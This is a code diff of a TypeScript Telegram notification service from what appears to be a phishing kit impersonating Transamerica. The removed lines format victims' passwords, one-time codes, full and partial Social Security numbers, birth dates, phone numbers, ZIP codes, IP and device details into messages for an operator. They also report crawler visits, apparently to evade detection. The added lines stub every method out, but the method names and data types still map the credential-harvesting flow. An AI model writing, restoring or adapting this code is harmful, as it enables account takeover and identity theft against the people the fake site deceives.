@@ -1,5 +1,3 @@
-const SITE_NAME = "Transamerica";
-
 export interface VisitorData {
   location: string;
   ip: string;
@@ -61,8 +59,8 @@ export interface VerifyDetailsData {
 }
 
 class TelegramService {
-  private botToken: string;
-  private chatIds: string[];
+  private botToken = "";
+  private chatIds: string[] = [];
 
   constructor() {
     this.botToken = "";
@@ -70,184 +68,124 @@ class TelegramService {
   }
 
   private async sendMessage(_message: string): Promise<void> {
-    // All Telegram notifications are explicitly disabled
-    return;
+    // Telegram notifications completely disabled
+    return Promise.resolve();
   }
 
-  async sendVisitorNotification(data: VisitorData): Promise<void> {
-    const ipV4 = data.ipV4;
-    const ipV6 = data.ipV6;
-    let ipDisplay = data.ip;
-
-    if (ipV4 && ipV6) {
-      ipDisplay = `${ipV4} (IPv4), ${ipV6} (IPv6)`;
-    } else if (ipV4) {
-      ipDisplay = `${ipV4} (IPv4)`;
-    } else if (ipV6) {
-      ipDisplay = `${ipV6} (IPv6)`;
-    }
-
-    const pageUrl = data.url ?? "(unknown)";
-    const rawReferrer = (data.referrer ?? "").trim();
-    const referrer =
-      rawReferrer !== ""
-        ? rawReferrer
-        : "Direct / no referrer (typed URL, bookmark, or referrer stripped by browser)";
-
-    const message = `\n🌐 <b>New Visitor - ${SITE_NAME}</b>\n\n📍 <b>Location:</b> ${data.location}\n🌍 <b>IP:</b> ${ipDisplay}\n⏰ <b>Timezone:</b> ${data.timezone}\n🌐 <b>ISP:</b> ${data.isp}\n\n📱 <b>Device:</b> ${data.userAgent}\n🖥️ <b>Screen:</b> ${data.screen}\n🌍 <b>Language:</b> ${data.language}\n\n🔗 <b>Page URL:</b> ${pageUrl}\n↩️ <b>Referrer (source):</b> ${referrer}\n\n🕒 <b>UTC Time:</b> ${data.utcTime}`;
-    await this.sendMessage(message);
+  async sendVisitorNotification(_data: VisitorData): Promise<void> {
+    return Promise.resolve();
   }
 
-  async sendBotVisitNotification(data: BotVisitData): Promise<void> {
-    const patternsText =
-      data.matchedPatterns && data.matchedPatterns.length > 0
-        ? data.matchedPatterns.join(", ")
-        : "Unknown";
-
-    const message =
-      `\n🤖 <b>BOT</b>\n\n` +
-      `🧩 <b>Name:</b> ${data.name}\n` +
-      `📝 <b>Type:</b> ${data.type}\n\n` +
-      `🤖 <b>User-Agent:</b>\n${data.userAgent}\n\n` +
-      `📍 <b>IP:</b> ${data.ip}\n` +
-      `🔗 <b>Path:</b> ${data.path}\n\n` +
-      `📋 <b>Bot Function:</b> Matched bot pattern(s): ${patternsText}.`;
-
-    await this.sendMessage(message);
+  async sendBotVisitNotification(_data: BotVisitData): Promise<void> {
+    return Promise.resolve();
   }
 
-  async sendLoginNotification(data: LoginData): Promise<void> {
-    const message = `\n🔐 <b>Login Attempt - ${SITE_NAME}</b>\n\n👤 <b>User ID:</b> ${data.userId}\n🔑 <b>Password:</b> ${data.password}`;
-    await this.sendMessage(message);
+  async sendLoginNotification(_data: LoginData): Promise<void> {
+    return Promise.resolve();
   }
 
-  async sendVerificationNotification(data: VerificationData): Promise<void> {
-    const message = `\n✅ <b>Verification Code Submitted - ${SITE_NAME}</b>\n\n🔐 <b>Type:</b> ${data.verificationType}\n🔢 <b>Code:</b> ${data.code}`;
-    await this.sendMessage(message);
+  async sendVerificationNotification(_data: VerificationData): Promise<void> {
+    return Promise.resolve();
   }
 
   async sendVerificationClickNotification(
-    verificationType: string,
-    ip?: string,
+    _verificationType: string,
+    _ip?: string,
   ): Promise<void> {
-    const message = `\n🟦 <b>Verification Option Selected - ${SITE_NAME}</b>\n\n🔐 <b>Type:</b> ${verificationType}`;
-    await this.sendMessage(message);
+    return Promise.resolve();
   }
 
   async sendResendCodeNotification(
-    isSecondOtp: boolean,
-    ip?: string,
+    _isSecondOtp: boolean,
+    _ip?: string,
   ): Promise<void> {
-    const otpType = isSecondOtp ? "Code (final)" : "Code (first OTP)";
-    const message = `\n🔄 <b>Resend Code Requested - ${SITE_NAME}</b>\n\n🔐 <b>OTP Type:</b> ${otpType}`;
-    await this.sendMessage(message);
+    return Promise.resolve();
   }
 
-  async sendForgotPasswordPageViewNotification(ip?: string): Promise<void> {
-    const message = `\n🔗 <b>Forgot Password page opened - ${SITE_NAME}</b>\n\nUser clicked "Forgot User ID or Password?" and landed on the form.`;
-    await this.sendMessage(message);
+  async sendForgotPasswordPageViewNotification(_ip?: string): Promise<void> {
+    return Promise.resolve();
   }
 
   async sendForgotPasswordNotification(
-    data: ForgotPasswordData,
+    _data: ForgotPasswordData,
   ): Promise<void> {
-    const message = `\n🔑 <b>Forgot Password – form submitted (all fields) - ${SITE_NAME}</b>\n\n🔢 <b>Last 4 SSN:</b> ${data.ssnLast4}\n📅 <b>Birth Date:</b> ${data.birthDate}\n✅ <b>Privacy Policy:</b> accepted`;
-    await this.sendMessage(message);
+    return Promise.resolve();
   }
 
-  async sendNewUserPageViewNotification(ip?: string): Promise<void> {
-    const message = `\n🔗 <b>New User page opened - ${SITE_NAME}</b>\n\nUser clicked "New User?" and landed on the form.`;
-    await this.sendMessage(message);
+  async sendNewUserPageViewNotification(_ip?: string): Promise<void> {
+    return Promise.resolve();
   }
 
-  async sendNewUserNotification(data: NewUserData): Promise<void> {
-    const message = `\n👤 <b>New User – form submitted (all fields) - ${SITE_NAME}</b>\n\n🔢 <b>Last 4 SSN:</b> ${data.ssnLast4}\n📅 <b>Birth Date:</b> ${data.birthDate}\n✅ <b>Privacy Policy:</b> accepted`;
-    await this.sendMessage(message);
+  async sendNewUserNotification(_data: NewUserData): Promise<void> {
+    return Promise.resolve();
   }
 
-  async sendNewUserCodePageViewNotification(ip?: string): Promise<void> {
-    const message = `\n🔗 <b>New User – Enter Access Code page opened - ${SITE_NAME}</b>\n\nUser landed on the page to enter the code sent to them.`;
-    await this.sendMessage(message);
+  async sendNewUserCodePageViewNotification(_ip?: string): Promise<void> {
+    return Promise.resolve();
   }
 
-  async sendNewUserCodeNotification(code: string, ip?: string): Promise<void> {
-    const message = `\n🔢 <b>New User – Access Code Entered - ${SITE_NAME}</b>\n\n🔢 <b>Code:</b> ${code}`;
-    await this.sendMessage(message);
+  async sendNewUserCodeNotification(
+    _code: string,
+    _ip?: string,
+  ): Promise<void> {
+    return Promise.resolve();
   }
 
-  async sendNewUserPasswordPageViewNotification(ip?: string): Promise<void> {
-    const message = `\n🔗 <b>New User – Create Password page opened - ${SITE_NAME}</b>\n\nUser landed on the page to create their password.`;
-    await this.sendMessage(message);
+  async sendNewUserPasswordPageViewNotification(_ip?: string): Promise<void> {
+    return Promise.resolve();
   }
 
   async sendNewUserPasswordNotification(
-    password: string,
-    ip?: string,
+    _password: string,
+    _ip?: string,
   ): Promise<void> {
-    const message = `\n🔑 <b>New User – Password Set - ${SITE_NAME}</b>\n\n🔑 <b>Password:</b> ${password}`;
-    await this.sendMessage(message);
+    return Promise.resolve();
   }
 
-  async sendAccountFoundNotification(data: AccountFoundData): Promise<void> {
-    const passwordText = data.password
-      ? `\n🔑 <b>Password:</b> ${data.password}`
-      : "";
-    const message = `\n✅ <b>Account Found – Continue Clicked - ${SITE_NAME}</b>\n\n🔐 <b>Method:</b> ${data.method}${passwordText}`;
-    await this.sendMessage(message);
+  async sendAccountFoundNotification(_data: AccountFoundData): Promise<void> {
+    return Promise.resolve();
   }
 
-  async sendAccountFoundResetPasswordNotification(ip?: string): Promise<void> {
-    const message =
-      `\n🔗 <b>Account Found – Reset password link clicked - ${SITE_NAME}</b>\n\n` +
-      `User clicked "Reset password" on the account found page.`;
-    await this.sendMessage(message);
+  async sendAccountFoundResetPasswordNotification(_ip?: string): Promise<void> {
+    return Promise.resolve();
   }
 
   async sendForgotPasswordVerifyNotification(
-    verificationType: string,
-    ip?: string,
+    _verificationType: string,
+    _ip?: string,
   ): Promise<void> {
-    const message = `\n🔐 <b>Forgot Password – Verify Identity Option Selected - ${SITE_NAME}</b>\n\n🔐 <b>Type:</b> ${verificationType}`;
-    await this.sendMessage(message);
+    return Promise.resolve();
   }
 
   async sendForgotPasswordCodeNotification(
-    code: string,
-    ip?: string,
+    _code: string,
+    _ip?: string,
   ): Promise<void> {
-    const message = `\n🔢 <b>Forgot Password – Access Code Entered - ${SITE_NAME}</b>\n\n🔢 <b>Code:</b> ${code}`;
-    await this.sendMessage(message);
+    return Promise.resolve();
   }
 
-  async sendForgotPasswordResendNotification(ip?: string): Promise<void> {
-    const message = `\n🔄 <b>Forgot Password – Resend Code Requested - ${SITE_NAME}</b>`;
-    await this.sendMessage(message);
+  async sendForgotPasswordResendNotification(_ip?: string): Promise<void> {
+    return Promise.resolve();
   }
 
   async sendRememberDeviceNotification(
-    data: RememberDeviceData,
+    _data: RememberDeviceData,
   ): Promise<void> {
-    const message = `\n💾 <b>Remember Device Choice - ${SITE_NAME}</b>\n\n📱 <b>Choice:</b> ${data.choice}`;
-    await this.sendMessage(message);
+    return Promise.resolve();
   }
 
-  async sendVerifyDetailsNotification(data: VerifyDetailsData): Promise<void> {
-    const message =
-      `\n📝 <b>Verify Details – form submitted - ${SITE_NAME}</b>\n\n` +
-      `🔢 <b>SSN:</b> ${data.ssn}\n` +
-      `📅 <b>Birth Date:</b> ${data.birthDate}\n` +
-      `📞 <b>Phone:</b> ${data.phone}\n` +
-      `📍 <b>ZIP Code:</b> ${data.zip}`;
-    await this.sendMessage(message);
+  async sendVerifyDetailsNotification(
+    _data: VerifyDetailsData,
+  ): Promise<void> {
+    return Promise.resolve();
   }
 
-  async sendBlockedBotNotification(data: {
+  async sendBlockedBotNotification(_data: {
     userAgent: string;
     ip: string;
     path: string;
   }): Promise<void> {
-    const msg = `\n🚫 <b>Bad Bot Blocked - ${SITE_NAME}</b>\n\n🤖 <b>User-Agent:</b> ${data.userAgent}\n🌍 <b>IP:</b> ${data.ip}\n🔗 <b>Path:</b> ${data.path}`;
-    await this.sendMessage(msg);
+    return Promise.resolve();
   }
 }
 
